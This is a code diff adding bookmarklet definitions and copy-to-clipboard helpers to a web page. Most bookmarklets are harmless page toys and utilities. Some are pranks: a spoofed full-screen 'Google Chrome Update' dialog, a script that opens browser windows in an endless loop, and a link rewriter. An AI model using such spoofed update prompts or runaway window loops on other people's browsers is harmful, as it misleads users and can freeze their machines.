+					'rainbow-text': 'javascript:(function(){ var elements = document.querySelectorAll("*"); for (var i = 0; i < elements.length; i++) { elements[i].style.color = "hsl(" + (Math.random() * 360) + ", 100%, 50%)"; } })();',
+					'spin-everything': 'javascript:(function(){ var elements = document.querySelectorAll("*"); for (var i = 0; i < elements.length; i++) { if (elements[i].tagName != "IMG") { elements[i].style.animation = "spinAndBounce 1s infinite"; elements[i].style.animationTimingFunction = "ease-in-out"; } } var keyframes = "@keyframes imageShift { 0% { transform: translateX(0px); } 50% { transform: translateX(20px); } 100% { transform: translateX(0px); } } @keyframes spinAndBounce { 0% { transform: rotate(0deg) scale(1); } 50% { transform: rotate(180deg) scale(1.2); } 100% { transform: rotate(360deg) scale(1); } } "; var style = document.createElement("style"); style.type = "text/css"; style.innerHTML = keyframes; document.head.appendChild(style);})();',
+					'gravity': 'javascript:(function(){ var elements = document.querySelectorAll("*"); var initialPositions = []; for (var i = 0; i < elements.length; i++) { var rect = elements[i].getBoundingClientRect(); initialPositions.push({ x: rect.x, y: rect.y }); } var gravity = 0.1; function fall() { for (var i = 0; i < elements.length; i++) { var rect = elements[i].getBoundingClientRect(); elements[i].style.top = rect.y + gravity + "px"; } } var timer = setInterval(function() { fall(); var screenBottom = window.innerHeight; for (var i = 0; i < elements.length; i++) { var rect = elements[i].getBoundingClientRect(); if (rect.bottom >= screenBottom) { elements[i].style.top = initialPositions[i].y + "px"; } } }, 30); })();',
+					'fake-update': 'javascript:(function() { var overlay = document.createElement("div"); overlay.style.position = "fixed"; overlay.style.top = "0"; overlay.style.left = "0"; overlay.style.width = "100%"; overlay.style.height = "100%"; overlay.style.background = "#FFFFFF"; overlay.style.opacity = "0.95"; overlay.style.zIndex = "9999999"; var dialog = document.createElement("div"); dialog.style.position = "absolute"; dialog.style.top = "50%"; dialog.style.left = "50%"; dialog.style.transform = "translate(-50%, -50%)"; dialog.style.width = "450px"; dialog.style.padding = "20px"; dialog.style.background = "#FFFFFF"; dialog.style.border = "1px solid #333333"; dialog.style.borderRadius = "5px"; dialog.style.boxShadow = "0 0 10px rgba(0,0,0,0.5)"; dialog.style.zIndex = "99999999"; var title = document.createElement("h1"); title.innerHTML = "Google Chrome Update"; title.style.marginTop = "0"; title.style.textAlign = "center"; dialog.appendChild(title); var message = document.createElement("p"); message.innerHTML = "Your version of Google Chrome is outdated. Please click the button below to update now."; message.style.margin = "20px 0"; message.style.textAlign = "center"; dialog.appendChild(message); var button = document.createElement("button"); button.innerHTML = "Update Now"; button.style.background = "#0078D7"; button.style.border = "none"; button.style.color = "#FFFFFF"; button.style.padding = "10px 20px"; button.style.borderRadius = "5px"; button.style.cursor = "pointer"; button.addEventListener("click", function() { window.location.href = "https://google.com/chrome"; }); dialog.appendChild(button); overlay.appendChild(dialog); document.body.appendChild(overlay); })();',
+					'fake-error': 'javascript:(function(){ var errorMessages = [ "Error: Server not found", "Error: Connection lost", "Error: Page not found", "Error: Invalid input", "Error: System overload" ]; var randomError = errorMessages[Math.floor(Math.random() * errorMessages.length)]; alert(randomError); document.body.style.backgroundColor = "magenta"; document.body.style.color = "yellow"; var audio = new Audio(\'https://www.myinstants.com/media/sounds/untitled_hG6mBU5.mp3\'); audio.play(); })();',
+					'link-changer': 'javascript:(function(){ var links = document.getElementsByTagName(\'a\'); for (var i = 0; i < links.length; i++) { var websites = [\'https://longdogechallenge.com/\', \'https://puginarug.com/\', \'https://onesquareminesweeper.com/\']; var randomWebsite = websites[Math.floor(Math.random() * websites.length)]; links[i].href = randomWebsite; } })();',
+					'infinite-tabs': 'javascript: alert("Use at your own risk."); while (true){window.open("https://www.google.com")}',
+					'edit-text': 'javascript:document.body.contentEditable = true; document.designMode = \'on\'; alert("Text editing enabled! Click on any text to edit it.");',
+					'remove-elements': 'javascript:(function(){ document.addEventListener(\'click\', function(e) { if (confirm(\'Remove this element?\')) { e.target.remove(); } }, true); alert("Element removal enabled! Click on any element to remove it."); })();',
+					'ad-blocker': 'javascript:(function(){ var selectors = [\'#sidebar-wrap\', \'#advert\', \'#xrail\', \'#middle-article-advert-container\', \'#sponsored-recommendations\', \'#around-the-web\', \'#sponsored-recommendations\', \'#taboola-content\', \'#taboola-below-taboola-native-thumbnails\', \'#inarticle_wrapper_div\', \'#rc-row-container\', \'#ads\', \'#at-share-dock\', \'#at4-share\', \'#at4-follow\', \'#right-ads-rail\', \'div#ad-interstitial\', \'div#advert-article\', \'div#ac-lre-player-ph\', \'.ad\', \'.avert\', \'.avert__wrapper\', \'.middle-banner-ad\', \'.advertisement\', \'.GoogleActiveViewClass\', \'.advert\', \'.cns-ads-stage\', \'.teads-inread\', \'.ad-banner\', \'.ad-anchored\', \'.js_shelf_ads\', \'.ad-slot\', \'.antenna\', \'.xrail-content\', \'.advertisement__leaderboard\', \'.ad-leaderboard\', \'.trc_rbox_outer\', \'.ks-recommended\', \'.article-da\', \'div.sponsored-stories-component\', \'div.addthis-smartlayers\', \'div.article-adsponsor\', \'div.signin-prompt\', \'div.article-bumper\', \'div.video-placeholder\', \'div.top-ad-container\', \'div.header-ad\', \'div.ad-unit\', \'div.demo-block\', \'div.OUTBRAIN\', \'div.ob-widget\', \'div.nwsrm-wrapper\', \'div.announcementBar\', \'div.partner-resources-block\', \'div.arrow-down\', \'div.m-ad\', \'div.story-interrupt\', \'div.taboola-recommended\', \'div.ad-cluster-container\', \'div.ctx-sidebar\', \'div.incognito-modal\', \'.OUTBRAIN\', \'.subscribe-button\', \'.ads9\', \'.leaderboards\', \'.GoogleActiveViewElement\', \'.mpu-container\', \'.ad-300x600\', \'.tf-ad-block\', \'.sidebar-ads-holder-top\', \'.ads-one\', \'.FullPageModal__scroller\', \'.content-ads-holder\', \'.widget-area\', \'.social-buttons\', \'.ac-player-ph\', \'script\', \'iframe\', \'video\', \'aside#sponsored-recommendations\', \'aside[role="banner"]\', \'aside\', \'amp-ad\', \'span[id^=ad_is_]\', \'div[class*="indianapolis-optin"]\', \'div[id^=google_ads_iframe]\', \'div[data-google-query-id]\', \'section[data-response]\', \'ins.adsbygoogle\', \'div[data-google-query-id]\', \'div[data-test-id="fullPageSignupModal"]\', \'div[data-test-id="giftWrap"]\']; for (let i in selectors) { let nodesList = document.querySelectorAll(selectors[i]); for (let i = 0; i < nodesList.length; i++) { let el = nodesList[i]; if (el && el.parentNode) el.parentNode.removeChild(el); } }})();',
+					'cookie-remover': 'javascript:void((function(){var a,b,c,e,f;f=0;a=document.cookie.split("; ");for(e=0;e<a.length&&a[e];e++){f++;for(b="."+location.host;b;b=b.replace(/^(?:%5C.|[^%5C.]+)/,"")){for(c=location.pathname;c;c=c.replace(/.$/,"")){document.cookie=(a[e]+"; domain="+b+"; path="+c+"; expires="+new Date((new Date()).getTime()-1e11).toGMTString());}}}alert("Expired "+f+" cookies");})())',
+					'url-compressor': 'javascript:void(open(\'http://tinyurl.com/create.php?url=\'+encodeURIComponent(location.href)))'
+				};
+
+				const code = codes[bookmarkletId];
+				if (!code) {
+					alert('Bookmarklet code not found!');
+					return;
+				}
+
+				// Try modern clipboard API first
+				if (navigator.clipboard && navigator.clipboard.writeText) {
+					navigator.clipboard.writeText(code).then(() => {
+						// Show feedback
+						const button = event.target;
+						const originalText = button.textContent;
+						button.textContent = 'Copied!';
+						button.classList.add('copied');
+						
+						setTimeout(() => {
+							button.textContent = originalText;
+							button.classList.remove('copied');
+						}, 2000);
+					}).catch(err => {
+						// If clipboard API fails, show modal
+						showCodeModal(code);
+					});
+				} else {
+					// Fallback for older browsers - try execCommand
+					const textarea = document.createElement('textarea');
+					textarea.value = code;
+					textarea.style.position = 'fixed';
+					textarea.style.left = '-9999px';
+					document.body.appendChild(textarea);
+					textarea.select();
+					textarea.setSelectionRange(0, 99999); // For mobile
+					
+					try {
+						const successful = document.execCommand('copy');
+						document.body.removeChild(textarea);
+						
+						if (successful) {
+							const button = event.target;
+							const originalText = button.textContent;
+							button.textContent = 'Copied!';
+							button.classList.add('copied');
+							setTimeout(() => {
+								button.textContent = originalText;
+								button.classList.remove('copied');
+							}, 2000);
+						} else {
+							showCodeModal(code);
+						}
+					} catch (err) {
+						document.body.removeChild(textarea);
+						showCodeModal(code);
+					}
+				}
+			}
+
+			// Show code modal for manual copying
+			function showCodeModal(code) {
+				// Remove existing modal if any
+				const existingModal = document.getElementById('code-modal');
+				if (existingModal) {
+					existingModal.remove();
+				}
+
+				const modal = document.createElement('div');
+				modal.id = 'code-modal';
+				modal.className = 'code-modal';
+				modal.innerHTML = `
+					<div class="code-modal-content">
+						<div class="code-modal-header">
+							<h3 class="code-modal-title">Copy Bookmarklet Code</h3>
+							<button class="code-modal-close" onclick="this.closest('.code-modal').remove()">&times;</button>
+						</div>
+						<p class="code-modal-instructions">
+							Select all the code below (Ctrl+A or Cmd+A), then copy it (Ctrl+C or Cmd+C). 
+							Then create a new bookmark and paste this code as the URL.
+						</p>
+						<textarea class="code-textarea" readonly>${code}</textarea>
+						<button class="bookmarklet-button" onclick="copyFromTextarea(this.previousElementSibling, this)">Copy Code</button>
+					</div>
+				`;
+
+				document.body.appendChild(modal);
+
+				// Close on background click
+				modal.addEventListener('click', function(e) {
+					if (e.target === modal) {
+						modal.remove();
+					}
+				});
+
+				// Auto-select textarea
+				const textarea = modal.querySelector('.code-textarea');
+				textarea.focus();
+				textarea.select();
+			}
+
+			// Copy from textarea helper
+			function copyFromTextarea(textarea, button) {
+				textarea.select();
+				textarea.setSelectionRange(0, 99999);
+				
+				try {
+					const successful = document.execCommand('copy');
+					if (successful) {
+						const originalText = button.textContent;
+						button.textContent = 'Copied!';
+						button.style.background = 'rgba(0, 255, 0, 0.2)';
+						button.style.borderColor = '#00ff00';
+						button.style.color = '#00ff00';
+						
+						setTimeout(() => {
+							button.textContent = originalText;
+							button.style.background = '';
+							button.style.borderColor = '';
+							button.style.color = '';
+						}, 2000);
+					} else {
+						alert('Please manually select and copy the code.');
+					}
+				} catch (err) {
+					alert('Please manually select and copy the code.');
+				}
+			}
+		</script>
 	</body>
 </html>
